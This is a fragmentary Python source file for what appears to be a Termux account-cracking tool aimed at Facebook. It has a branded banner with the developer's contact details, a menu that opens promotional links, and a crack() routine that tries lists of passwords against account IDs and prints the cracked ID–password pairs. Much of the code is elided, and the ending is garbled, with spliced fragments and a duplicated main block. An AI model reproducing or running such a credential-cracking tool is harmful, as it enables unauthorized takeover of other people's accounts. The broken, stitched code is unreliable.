...
\x1b[1;94m╔═════════════════════════════════════════════════════╗
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] DEVELOPER      :        HASNAT RAYHAN       \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] FACEBOOK       :        HASNAT RAYHANツ      \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] WHATSAPP       :        +8801857644257           \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] GITHUB         :        RAYHANBHAI62 	      \x1b[1;94m║
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] YOUTUBE        :                   \x1b[1;94m║
...
\x1b[1;94m║\x1b[1;92m[\x1b[1;91m✔\x1b[1;92m] VERSION        :        0.1                    \x1b[1;94m║
\x1b[1;94m╚═════════════════════════════════════════════════════╝""")
...
def menu():
	#ckx()
	clear()
	print(f"{W}[{G}01{W}] FILE   CRACK ")
	print(f"{W}[{G}02{W}] CONTACT ADMIN")
	print(f"{W}[{RED}00{W}] Exit")
	linex()
	me=input(f'\033[1;31m[\033[1;32m?\033[1;31m]\033[1;32m CHOICE : ')
	if me in ["1", "01"]:
		os.system("xdg-open https://t.me/rayhanbhai62_clone")
		file_crk()
	elif me in ["2", "02"]:
		os.system("xdg-open https://www.facebook.com/rayhan1037?mibextid=ZbWKwL")
def file_crk():
    os.system('clear');
    D().plerr()
class D:
	...
	def plerr(self):
		...
		banner()
		try:
			os.system("xdg-open https://github.com/rayhanbhai62")
...
def Settings():
	...
	os.system("xdg-open https://m.facebook.com/groups/termux.working.commands/?ref=share&mibextid=jf9HGS")
	if hc in ['1','01']:
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'PASSWORD SHOULD HAVE MINIMAM 6 CHARACTER')
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo} [RAYHAN-CHECKING] {h}{loop}|{len(id)} | OK:-{h}{ok} ")
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r\r\x1b[38;5;46m[RAYHAN-OK] '+idf+ ' | '+pw+'')
...
if __name__=='__main__':
    ...
    menu()nu()  except:pass
    menu().exceptions.ConnectionError:
			time.sleep(10)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
